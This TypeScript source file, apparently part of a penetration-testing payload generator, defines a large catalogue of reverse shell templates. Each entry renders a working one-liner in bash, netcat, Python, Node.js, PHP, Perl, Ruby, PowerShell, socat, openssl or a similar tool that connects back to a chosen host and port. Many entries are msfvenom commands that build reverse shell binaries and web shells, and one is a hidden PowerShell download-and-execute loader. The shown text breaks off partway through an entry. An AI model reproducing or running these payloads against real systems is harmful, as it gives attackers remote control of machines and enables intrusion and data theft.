import type {
  ListenerTemplate,
  ReverseShellConfig,
  ReverseShellTemplate,
  UpgradeRecipe,
} from "./types";

function q(value: string): string {
  return value.replace(/'/g, `'\\''`);
}

export const reverseShellTemplates: ReverseShellTemplate[] = [
  {
    id: "bash-dev-tcp",
    name: "Bash /dev/tcp",
    family: "bash",
    platform: "linux",
    description: "Classic Bash TCP redirection one-liner.",
    defaultShell: "/bin/bash",
    render: ({ lhost, lport, shell }) =>
      `${shell} -i >& /dev/tcp/${lhost}/${lport} 0>&1`,
  },
  {
    id: "bash-fd-196",
    name: "Bash FD 196",
    family: "bash",
    platform: "linux",
    description: "Bash reverse shell using an explicit file descriptor.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport, shell }) =>
      `0<&196;exec 196<>/dev/tcp/${lhost}/${lport}; ${shell} <&196 >&196 2>&196`,
  },
  {
    id: "bash-c-exec",
    name: "Bash -c exec",
    family: "bash",
    platform: "linux",
    description: "Bash reverse shell wrapped in bash -c with exec redirection.",
    defaultShell: "/bin/bash",
    render: ({ lhost, lport }) =>
      `bash -c 'exec bash -i &>/dev/tcp/${lhost}/${lport} <&1'`,
  },
  {
    id: "bash-5-fd",
    name: "Bash FD 5",
    family: "bash",
    platform: "linux",
    description: "Bash reverse shell using file descriptor 5 for TCP I/O.",
    defaultShell: "/bin/bash",
    render: ({ lhost, lport }) =>
      `bash -i 5<> /dev/tcp/${lhost}/${lport} 0<&5 1>&5 2>&5`,
  },
  {
    id: "bash-read-line",
    name: "Bash read loop",
    family: "bash",
    platform: "linux",
    description: "Bash command loop over /dev/tcp without spawning a full PTY.",
    defaultShell: "/bin/bash",
    render: ({ lhost, lport }) =>
      `bash -c 'while read line 0<&5; do $line 2>&5 >&5; done 5<>/dev/tcp/${lhost}/${lport}'`,
  },
  {
    id: "sh-dev-tcp",
    name: "sh /dev/tcp",
    family: "sh",
    platform: "linux",
    description:
      "POSIX sh reverse shell when /dev/tcp is available (often via dash).",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport, shell }) =>
      `sh -c '${shell} -i >& /dev/tcp/${lhost}/${lport} 0>&1'`,
  },
  {
    id: "dash-dev-tcp",
    name: "dash /dev/tcp",
    family: "sh",
    platform: "linux",
    description: "dash reverse shell using /dev/tcp redirection.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport, shell }) =>
      `dash -c '${shell} -i >& /dev/tcp/${lhost}/${lport} 0>&1'`,
  },
  {
    id: "macos-bash-dev-tcp",
    name: "macOS Bash /dev/tcp",
    family: "bash",
    platform: "macos",
    description: "Bash /dev/tcp reverse shell for macOS targets.",
    defaultShell: "/bin/bash",
    render: ({ lhost, lport, shell }) =>
      `${shell} -i >& /dev/tcp/${lhost}/${lport} 0>&1`,
  },
  {
    id: "nc-mkfifo",
    name: "Netcat mkfifo",
    family: "nc",
    platform: "linux",
    description: "Works with netcat builds that do not expose -e.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport, shell }) =>
      `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${lhost} ${lport} >/tmp/f`,
  },
  {
    id: "nc-e",
    name: "Netcat -e",
    family: "nc",
    platform: "multi",
    description: "Shortest netcat variant when -e is available.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport, shell }) => `nc -e ${shell} ${lhost} ${lport}`,
  },
  {
    id: "ncat-exec",
    name: "Ncat --exec",
    family: "nc",
    platform: "multi",
    description: "Ncat reverse shell using the explicit --exec option.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport, shell }) =>
      `ncat ${lhost} ${lport} --exec ${shell}`,
  },
  {
    id: "ncat-sh-c",
    name: "Ncat -c",
    family: "nc",
    platform: "multi",
    description: "Ncat reverse shell using the -c command option.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport, shell }) => `ncat ${lhost} ${lport} -c ${shell}`,
  },
  {
    id: "nc-openbsd-mkfifo",
    name: "OpenBSD nc mkfifo",
    family: "nc",
    platform: "linux",
    description: "OpenBSD netcat fallback using a FIFO and no -e option.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport, shell }) =>
      `rm -f /tmp/f;mkfifo /tmp/f;${shell} -i < /tmp/f 2>&1 | nc ${lhost} ${lport} > /tmp/f`,
  },
  {
    id: "nc-traditional-e",
    name: "Netcat traditional -e",
    family: "nc",
    platform: "linux",
    description:
      "Reverse shell for netcat-traditional builds that expose the -e option.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport, shell }) =>
      `nc.traditional -e ${shell} ${lhost} ${lport}`,
  },
  {
    id: "nc-c-exec",
    name: "Netcat -c",
    family: "nc",
    platform: "multi",
    description: "BSD-style netcat reverse shell using the -c command option.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport, shell }) => `nc -c ${shell} ${lhost} ${lport}`,
  },
  {
    id: "ncat-ssl-exec",
    name: "Ncat SSL --exec",
    family: "nc",
    platform: "multi",
    description:
      "TLS reverse shell using ncat --ssl (requires OpenSSL-enabled ncat on the target).",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport, shell }) =>
      `ncat --ssl ${lhost} ${lport} --exec ${shell}`,
  },
  {
    id: "macos-nc-mkfifo",
    name: "macOS nc mkfifo",
    family: "nc",
    platform: "macos",
    description: "macOS netcat FIFO fallback when -e is unavailable.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport, shell }) =>
      `rm -f /tmp/f;mkfifo /tmp/f;${shell} -i < /tmp/f 2>&1 | nc ${lhost} ${lport} > /tmp/f`,
  },
  {
    id: "python3-socket",
    name: "Python 3 socket",
    family: "python",
    platform: "multi",
    description: "Python reverse shell with stdio duplicated to the socket.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport, shell }) =>
      `python3 -c 'import os,socket,subprocess;s=socket.socket();s.connect(("${lhost}",${lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["${shell}","-i"])'`,
  },
  {
    id: "python2-socket",
    name: "Python 2 socket",
    family: "python",
    platform: "multi",
    description: "Python 2-compatible socket reverse shell.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport, shell }) =>
      `python -c 'import os,socket,subprocess;s=socket.socket();s.connect(("${lhost}",${lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["${shell}","-i"])'`,
  },
  {
    id: "python3-pty",
    name: "Python 3 PTY",
    family: "python",
    platform: "multi",
    description:
      "Python 3 reverse shell that spawns the selected shell through pty.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport, shell }) =>
      `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("${lhost}",${lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("${shell}")'`,
  },
  {
    id: "python3-subprocess",
    name: "Python 3 subprocess",
    family: "python",
    platform: "multi",
    description: "Python 3 reverse shell using subprocess.Popen.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport, shell }) =>
      `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.Popen(["${shell}","-i"])'`,
  },
  {
    id: "python3-no-spaces",
    name: "Python 3 compact",
    family: "python",
    platform: "multi",
    description:
      "Compact Python 3 reverse shell useful for tight input fields.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport, shell }) =>
      `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${lhost}",${lport}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("${shell}")'`,
  },
  {
    id: "nodejs-child-process",
    name: "Node.js child_process",
    family: "node",
    platform: "multi",
    description: "Node.js reverse shell using net and child_process.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport, shell }) =>
      `node -e "const net=require('net'),cp=require('child_process'),sh=cp.spawn('${q(shell)}',['-i']);const c=new net.Socket();c.connect(${lport},'${lhost}',()=>{c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c)});"`,
  },
  {
    id: "nodejs-command-loop",
    name: "Node.js command loop",
    family: "node",
    platform: "multi",
    description: "Node.js reverse command loop using net and exec.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport }) =>
      `node -e "const net=require('net'),cp=require('child_process'),c=net.connect(${lport},'${lhost}',()=>c.write('$ '));c.on('data',d=>cp.exec(d.toString(),(e,o,r)=>c.write(o+r+'$ ')));"`,
  },
  {
    id: "nodejs-reverse-sh",
    name: "Node.js reverse sh",
    family: "node",
    platform: "multi",
    description: "Node.js reverse shell spawning the selected shell directly.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport, shell }) =>
      `node -e "require('child_process').spawn('${q(shell)}',['-i'],{stdio:['pipe','pipe','pipe']}).on('spawn',function(){const n=require('net').connect(${lport},'${lhost}');this.stdin.pipe(n);n.pipe(this.stdin);this.stdout.pipe(n);this.stderr.pipe(n);})"`,
  },
  {
    id: "java-runtime",
    name: "Java Runtime",
    family: "java",
    platform: "multi",
    description:
      "Java reverse shell using Runtime.exec and socket redirection.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport, shell }) =>
      `java -e 'var s=new java.net.Socket("${lhost}",${lport});var p=new java.lang.ProcessBuilder(new String[]{"${q(shell)}","-i"}).redirectInput(s.getInputStream()).redirectOutput(s.getOutputStream()).redirectError(s.getOutputStream()).start();p.waitFor();'`,
  },
  {
    id: "jshell-processbuilder",
    name: "JShell ProcessBuilder",
    family: "java",
    platform: "multi",
    description:
      "JShell reverse shell using ProcessBuilder and socket streams.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport, shell }) =>
      `jshell -q <<< 'var s=new java.net.Socket("${lhost}",${lport});var p=new ProcessBuilder("${q(shell)}","-i").redirectErrorStream(true).start();s.getInputStream().transferTo(p.getOutputStream());p.getInputStream().transferTo(s.getOutputStream());'`,
  },
  {
    id: "golang-tcp",
    name: "Go TCP reverse shell",
    family: "go",
    platform: "multi",
    description:
      "Go reverse shell compiled as a one-liner for targets with Go.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport }) =>
      `echo 'package main;import("net";"os/exec");func main(){c,_:=net.Dial("tcp","${lhost}:${lport}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/rs.go && go run /tmp/rs.go`,
  },
  {
    id: "golang-bash",
    name: "Go Bash reverse",
    family: "go",
    platform: "multi",
    description: "Go reverse shell that launches bash through os/exec.",
    defaultShell: "/bin/bash",
    render: ({ lhost, lport }) =>
      `echo 'package main;import("net";"os/exec");func main(){c,_:=net.Dial("tcp","${lhost}:${lport}");cmd:=exec.Command("/bin/bash","-i");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' >/tmp/r.go && go run /tmp/r.go`,
  },
  {
    id: "zsh-dev-tcp",
    name: "Zsh /dev/tcp",
    family: "bash",
    platform: "linux",
    description: "Zsh reverse shell using /dev/tcp redirection.",
    defaultShell: "/bin/zsh",
    render: ({ lhost, lport, shell }) =>
      `zsh -c '${shell} -i >& /dev/tcp/${lhost}/${lport} 0>&1'`,
  },
  {
    id: "zsh-fd",
    name: "Zsh FD",
    family: "bash",
    platform: "linux",
    description: "Zsh reverse shell using an explicit TCP file descriptor.",
    defaultShell: "/bin/zsh",
    render: ({ lhost, lport }) =>
      `zsh -c 'zmodload zsh/net/tcp && ztcp ${lhost} ${lport} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'`,
  },
  {
    id: "powershell-iex",
    name: "PowerShell IEX",
    family: "powershell",
    platform: "windows",
    description: "PowerShell reverse shell using Invoke-Expression over TCP.",
    defaultShell: "powershell.exe",
    render: ({ lhost, lport }) =>
      `$c=New-Object Net.Sockets.TCPClient('${lhost}',${lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);IEX $d 2>&1|Out-String|%{Write-Host $_};$r=[Text.Encoding]::ASCII.GetBytes($_+'PS '+(pwd).Path+'> ');$s.Write($r,0,$r.Length)};$c.Close()`,
  },
  {
    id: "powershell-downloadstring",
    name: "PowerShell DownloadString",
    family: "staged",
    platform: "windows",
    description:
      "Staged PowerShell loader that pulls a script from your HTTP server.",
    defaultShell: "powershell.exe",
    render: ({ lhost, httpPort, lport }) =>
      `powershell -NoP -NonI -W Hidden -Command "IEX(New-Object Net.WebClient).DownloadString('http://${lhost}:${httpPort ?? lport}/rs.ps1')"`,
  },
  {
    id: "msfvenom-linux-x64-elf",
    name: "msfvenom Linux x64 ELF",
    family: "bash",
    platform: "linux",
    description: "Generate a Linux x64 shell_reverse_tcp ELF executable.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport }) =>
      `msfvenom -p linux/x64/shell_reverse_tcp LHOST=${lhost} LPORT=${lport} -f elf -o shell.elf`,
  },
  {
    id: "msfvenom-linux-x86-elf",
    name: "msfvenom Linux x86 ELF",
    family: "bash",
    platform: "linux",
    description: "Generate a Linux x86 shell_reverse_tcp ELF executable.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport }) =>
      `msfvenom -p linux/x86/shell_reverse_tcp LHOST=${lhost} LPORT=${lport} -f elf -o shell-x86.elf`,
  },
  {
    id: "msfvenom-windows-x64-exe",
    name: "msfvenom Windows x64 EXE",
    family: "powershell",
    platform: "windows",
    description: "Generate a Windows x64 shell_reverse_tcp executable.",
    defaultShell: "cmd.exe",
    render: ({ lhost, lport }) =>
      `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${lhost} LPORT=${lport} -f exe -o shell-x64.exe`,
  },
  {
    id: "msfvenom-windows-x86-exe",
    name: "msfvenom Windows x86 EXE",
    family: "powershell",
    platform: "windows",
    description: "Generate a Windows x86 shell_reverse_tcp executable.",
    defaultShell: "cmd.exe",
    render: ({ lhost, lport }) =>
      `msfvenom -p windows/shell_reverse_tcp LHOST=${lhost} LPORT=${lport} -f exe -o shell-x86.exe`,
  },
  {
    id: "msfvenom-macos-x64-macho",
    name: "msfvenom macOS x64 Mach-O",
    family: "bash",
    platform: "macos",
    description: "Generate a macOS x64 shell_reverse_tcp Mach-O binary.",
    defaultShell: "/bin/zsh",
    render: ({ lhost, lport }) =>
      `msfvenom -p osx/x64/shell_reverse_tcp LHOST=${lhost} LPORT=${lport} -f macho -o shell.macho`,
  },
  {
    id: "msfvenom-php-reverse",
    name: "msfvenom PHP reverse",
    family: "php",
    platform: "multi",
    description: "Generate a raw PHP reverse shell payload.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport }) =>
      `msfvenom -p php/reverse_php LHOST=${lhost} LPORT=${lport} -f raw -o shell.php`,
  },
  {
    id: "msfvenom-python-reverse",
    name: "msfvenom Python reverse",
    family: "python",
    platform: "multi",
    description: "Generate a raw Python reverse shell command payload.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport }) =>
      `msfvenom -p cmd/unix/reverse_python LHOST=${lhost} LPORT=${lport} -f raw`,
  },
  {
    id: "msfvenom-bash-cmd",
    name: "msfvenom Bash command",
    family: "bash",
    platform: "linux",
    description: "Generate a raw Bash reverse shell command payload.",
    defaultShell: "/bin/bash",
    render: ({ lhost, lport }) =>
      `msfvenom -p cmd/unix/reverse_bash LHOST=${lhost} LPORT=${lport} -f raw`,
  },
  {
    id: "msfvenom-bash",
    name: "msfvenom Bash",
    family: "bash",
    platform: "linux",
    description:
      "Generate a Metasploit Bash payload locally, then run the output on the target.",
    defaultShell: "/bin/bash",
    render: ({ lhost, lport }) =>
      `msfvenom -p cmd/unix/reverse_bash LHOST=${lhost} LPORT=${lport} -f raw`,
  },
  {
    id: "msfvenom-perl-cmd",
    name: "msfvenom Perl command",
    family: "perl",
    platform: "multi",
    description: "Generate a raw Perl reverse shell command payload.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport }) =>
      `msfvenom -p cmd/unix/reverse_perl LHOST=${lhost} LPORT=${lport} -f raw`,
  },
  {
    id: "msfvenom-nodejs-cmd",
    name: "msfvenom Node.js command",
    family: "node",
    platform: "multi",
    description: "Generate a raw Node.js reverse shell command payload.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport }) =>
      `msfvenom -p cmd/unix/reverse_nodejs LHOST=${lhost} LPORT=${lport} -f raw`,
  },
  {
    id: "msfvenom-java-jar",
    name: "msfvenom Java JAR",
    family: "java",
    platform: "multi",
    description: "Generate a Java shell_reverse_tcp JAR payload.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport }) =>
      `msfvenom -p java/shell_reverse_tcp LHOST=${lhost} LPORT=${lport} -f jar -o shell.jar`,
  },
  {
    id: "msfvenom-jsp",
    name: "msfvenom JSP",
    family: "java",
    platform: "multi",
    description: "Generate a JSP shell_reverse_tcp web payload.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport }) =>
      `msfvenom -p java/jsp_shell_reverse_tcp LHOST=${lhost} LPORT=${lport} -f raw -o shell.jsp`,
  },
  {
    id: "msfvenom-war",
    name: "msfvenom WAR",
    family: "java",
    platform: "multi",
    description: "Generate a WAR archive containing a JSP reverse shell.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport }) =>
      `msfvenom -p java/jsp_shell_reverse_tcp LHOST=${lhost} LPORT=${lport} -f war -o shell.war`,
  },
  {
    id: "msfvenom-asp",
    name: "msfvenom ASP",
    family: "powershell",
    platform: "windows",
    description: "Generate a classic ASP reverse shell payload.",
    defaultShell: "cmd.exe",
    render: ({ lhost, lport }) =>
      `msfvenom -p windows/shell_reverse_tcp LHOST=${lhost} LPORT=${lport} -f asp -o shell.asp`,
  },
  {
    id: "msfvenom-aspx",
    name: "msfvenom ASPX",
    family: "powershell",
    platform: "windows",
    description: "Generate an ASPX reverse shell payload for IIS targets.",
    defaultShell: "cmd.exe",
    render: ({ lhost, lport }) =>
      `msfvenom -p windows/x64/shell_reverse_tcp LHOST=${lhost} LPORT=${lport} -f aspx -o shell.aspx`,
  },
  {
    id: "msfvenom-linux-aarch64-elf",
    name: "msfvenom Linux aarch64 ELF",
    family: "bash",
    platform: "linux",
    description: "Generate a Linux aarch64 shell_reverse_tcp ELF executable.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport }) =>
      `msfvenom -p linux/aarch64/shell_reverse_tcp LHOST=${lhost} LPORT=${lport} -f elf -o shell-aarch64.elf`,
  },
  {
    id: "msfvenom-powershell-cmd",
    name: "msfvenom PowerShell command",
    family: "powershell",
    platform: "windows",
    description: "Generate a raw PowerShell reverse shell command payload.",
    defaultShell: "powershell.exe",
    render: ({ lhost, lport }) =>
      `msfvenom -p windows/powershell_reverse_tcp LHOST=${lhost} LPORT=${lport} -f raw`,
  },
  {
    id: "msfvenom-ruby-cmd",
    name: "msfvenom Ruby command",
    family: "ruby",
    platform: "multi",
    description: "Generate a raw Ruby reverse shell command payload.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport }) =>
      `msfvenom -p cmd/unix/reverse_ruby LHOST=${lhost} LPORT=${lport} -f raw`,
  },
  {
    id: "awk-tcp",
    name: "awk TCP",
    family: "awk",
    platform: "linux",
    description: "awk reverse shell for systems with /inet/tcp support.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport }) =>
      `awk 'BEGIN{s="/inet/tcp/0/${lhost}/${lport}";while(42){do{printf "shell> "|&s;s|&getline c;if(c){while((c|&getline)>0)print $0|&s;close(c)}}while(c!="exit")}}'`,
  },
  {
    id: "awk-sh-loop",
    name: "awk sh loop",
    family: "awk",
    platform: "linux",
    description:
      "awk command loop that executes received lines through /bin/sh.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport }) =>
      `awk 'BEGIN{s="/inet/tcp/0/${lhost}/${lport}";while(1){s|&getline c;if(c){while((c|&getline)>0)print $0|&s;close(c)}}}'`,
  },
  {
    id: "lua-socket",
    name: "LuaSocket",
    family: "lua",
    platform: "multi",
    description: "Lua reverse shell using the LuaSocket module.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport }) =>
      `lua -e 'local s=require("socket");local c=s.tcp();c:connect("${lhost}",${lport});while true do local r,x=c:receive();local f=io.popen(r,"r");local b=f:read("*a");c:send(b);end'`,
  },
  {
    id: "lua-os-execute",
    name: "Lua os.execute",
    family: "lua",
    platform: "multi",
    description: "LuaSocket command loop using os.execute redirection.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport }) =>
      `lua -e 'local s=require("socket").tcp();s:connect("${lhost}",${lport});while true do local c=s:receive();os.execute(c.." 2>&1 | nc ${lhost} ${lport}") end'`,
  },
  {
    id: "php-proc-open",
    name: "PHP proc_open",
    family: "php",
    platform: "multi",
    description: "PHP one-liner for web RCE contexts.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport, shell }) =>
      `php -r '$s=fsockopen("${lhost}",${lport});proc_open("${q(shell)} -i", array(0=>$s, 1=>$s, 2=>$s),$p);'`,
  },
  {
    id: "php-fsockopen-exec",
    name: "PHP exec",
    family: "php",
    platform: "multi",
    description:
      "PHP fsockopen reverse shell using exec and file descriptor redirection.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport, shell }) =>
      `php -r '$s=fsockopen("${lhost}",${lport});exec("${q(shell)} -i <&3 >&3 2>&3");'`,
  },
  {
    id: "php-cmd",
    name: "PHP cmd",
    family: "php",
    platform: "multi",
    description: "PHP reverse shell using backtick command execution.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport, shell }) =>
      `php -r '$s=fsockopen("${lhost}",${lport});\`${q(shell)} -i <&3 >&3 2>&3\`;'`,
  },
  {
    id: "php-cmd-2",
    name: "PHP cmd 2",
    family: "php",
    platform: "multi",
    description:
      "PHP reverse shell using proc_open with socket-backed descriptors.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport, shell }) =>
      `php -r '$s=fsockopen("${lhost}",${lport});$d=array(0=>$s,1=>$s,2=>$s);$p=proc_open("${q(shell)} -i",$d,$pipes);'`,
  },
  {
    id: "php-shell-exec",
    name: "PHP shell_exec",
    family: "php",
    platform: "multi",
    description: "PHP fsockopen reverse shell using shell_exec.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport, shell }) =>
      `php -r '$s=fsockopen("${lhost}",${lport});shell_exec("${q(shell)} -i <&3 >&3 2>&3");'`,
  },
  {
    id: "php-fsockopen-system",
    name: "PHP system",
    family: "php",
    platform: "multi",
    description: "PHP command loop over fsockopen using system().",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport }) =>
      `php -r '$s=fsockopen("${lhost}",${lport});while(!feof($s)){system(fgets($s));}'`,
  },
  {
    id: "php-fsockopen-passthru",
    name: "PHP passthru",
    family: "php",
    platform: "multi",
    description:
      "PHP fsockopen reverse shell using passthru with fd redirection.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport, shell }) =>
      `php -r '$s=fsockopen("${lhost}",${lport});passthru("${q(shell)} -i <&3 >&3 2>&3");'`,
  },
  {
    id: "php-popen",
    name: "PHP popen",
    family: "php",
    platform: "multi",
    description: "PHP command loop over fsockopen using popen.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport }) =>
      `php -r '$s=fsockopen("${lhost}",${lport});while(!feof($s)){$p=popen(fgets($s),"r");while(!feof($p)){fwrite($s,fread($p,1024));}pclose($p);}'`,
  },
  {
    id: "php-stream-socket-loop",
    name: "PHP stream_socket loop",
    family: "php",
    platform: "multi",
    description:
      "PHP reverse command loop using stream_socket_client and popen output.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport }) =>
      `php -r '$s=stream_socket_client("tcp://${lhost}:${lport}");while(!feof($s)){$cmd=fgets($s);if($cmd===false)break;$p=popen(trim($cmd),"r");while(!feof($p))fwrite($s,fread($p,1024));pclose($p);}'`,
  },
  {
    id: "perl-socket",
    name: "Perl socket",
    family: "perl",
    platform: "multi",
    description: "Perl reverse shell using Socket from the standard library.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport, shell }) =>
      `perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"${lhost}:${lport}");STDIN->fdopen($c,r);$~->fdopen($c,w);system("${q(shell)} -i");'`,
  },
  {
    id: "perl-dup2",
    name: "Perl dup2",
    family: "perl",
    platform: "multi",
    description:
      "Perl reverse shell using Socket and duplicated stdio handles.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport, shell }) =>
      `perl -e 'use Socket;$i="${lhost}";$p=${lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("${q(shell)} -i");};'`,
  },
  {
    id: "ruby-socket",
    name: "Ruby socket",
    family: "ruby",
    platform: "multi",
    description: "Ruby reverse shell using TCPSocket.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport }) =>
      `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("${lhost}","${lport}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`,
  },
  {
    id: "ruby-stdio-reopen",
    name: "Ruby stdio reopen",
    family: "ruby",
    platform: "multi",
    description: "Ruby reverse shell that reopens stdio on a TCP socket.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport, shell }) =>
      `ruby -rsocket -e 'c=TCPSocket.new("${lhost}",${lport});$stdin.reopen(c);$stdout.reopen(c);$stderr.reopen(c);exec("${q(shell)} -i")'`,
  },
  {
    id: "ruby-exec",
    name: "Ruby exec",
    family: "ruby",
    platform: "multi",
    description: "Ruby reverse shell using TCPSocket and exec.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport, shell }) =>
      `ruby -rsocket -e 's=TCPSocket.new("${lhost}",${lport});exec sprintf("${q(shell)} -i <&%d >&%d 2>&%d",s.fileno,s.fileno,s.fileno)'`,
  },
  {
    id: "socat-pty",
    name: "Socat PTY",
    family: "socat",
    platform: "linux",
    description: "Socat reverse shell that starts with a PTY-friendly process.",
    defaultShell: "/bin/bash",
    render: ({ lhost, lport, shell }) =>
      `socat exec:'${q(shell)} -li',pty,stderr,setsid,sigint,sane tcp:${lhost}:${lport}`,
  },
  {
    id: "socat-exec",
    name: "Socat exec",
    family: "socat",
    platform: "linux",
    description: "Simple socat reverse shell using exec without PTY options.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport, shell }) =>
      `socat exec:'${q(shell)} -i',stderr tcp:${lhost}:${lport}`,
  },
  {
    id: "socat-tcp4-exec",
    name: "Socat TCP4 EXEC",
    family: "socat",
    platform: "linux",
    description:
      "Socat reverse shell using TCP4 connect syntax (requires socat on the target).",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport, shell }) =>
      `socat TCP4:${lhost}:${lport} EXEC:${shell},pty,stderr,setsid,sigint,sane`,
  },
  {
    id: "socat-openssl",
    name: "Socat OpenSSL",
    family: "socat",
    platform: "linux",
    description:
      "Socat reverse shell over TLS with certificate checks disabled.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport, shell }) =>
      `socat exec:'${q(shell)} -i',pty,stderr,setsid,sigint,sane openssl:${lhost}:${lport},verify=0`,
  },
  {
    id: "openssl-fifo",
    name: "OpenSSL FIFO",
    family: "openssl",
    platform: "linux",
    description: "TLS reverse shell using openssl s_client and a named pipe.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport, shell }) =>
      `rm -f /tmp/rs;mkfifo /tmp/rs;${shell} -i < /tmp/rs 2>&1 | openssl s_client -quiet -connect ${lhost}:${lport} > /tmp/rs;rm /tmp/rs`,
  },
  {
    id: "openssl-client",
    name: "OpenSSL client",
    family: "openssl",
    platform: "linux",
    description: "OpenSSL s_client reverse shell using a temporary FIFO.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport, shell }) =>
      `mkfifo /tmp/s;${shell} -i </tmp/s 2>&1 | openssl s_client -quiet -connect ${lhost}:${lport} >/tmp/s;rm /tmp/s`,
  },
  {
    id: "busybox-nc-e",
    name: "BusyBox nc -e",
    family: "nc",
    platform: "linux",
    description: "BusyBox netcat reverse shell for compact Linux environments.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport, shell }) =>
      `busybox nc ${lhost} ${lport} -e ${shell}`,
  },
  {
    id: "telnet-mkfifo",
    name: "Telnet mkfifo",
    family: "telnet",
    platform: "linux",
    description: "Telnet reverse shell fallback using a named pipe.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport, shell }) =>
      `rm -f /tmp/p;mkfifo /tmp/p;${shell} -i < /tmp/p 2>&1 | telnet ${lhost} ${lport} > /tmp/p`,
  },
  {
    id: "telnet-double",
    name: "Telnet double pipe",
    family: "telnet",
    platform: "linux",
    description: "Telnet reverse shell using two outbound telnet connections.",
    defaultShell: "/bin/sh",
    render: ({ lhost, lport, shell }) =>
      `${shell} -i | telnet ${lhost} ${lport} | ${shell} | telnet ${lhost} ${lport}`,
  },
  {
    id: "cmd-ncat-exec",
    name: "CMD ncat --exec",
    family: "cmd",
    platform: "windows",
    description: "Windows cmd.exe reverse shell using Ncat --exec.",
    defaultShell: "cmd.exe",
    render: ({ lhost, lport, shell }) =>
      `ncat.exe ${lhost} ${lport} --exec ${shell}`,
  },
  {
    id: "cmd-ncat-e",
    name: "CMD ncat -e",
    family: "cmd",
    platform: "windows",
    description: "Windows cmd.exe reverse shell using Ncat -e syntax.",
    defaultShell: "cmd.exe",
    render: ({ lhost, lport, shell }) =>
      `ncat.exe ${lhost} ${lport} -e ${shell}`,
  },
  {
    id: "cmd-nc-e",
    name: "CMD nc -e",
    family: "cmd",
    platform: "windows",
    description: "Windows cmd.exe reverse shell using nc.exe -e.",
    defaultShell: "cmd.exe",
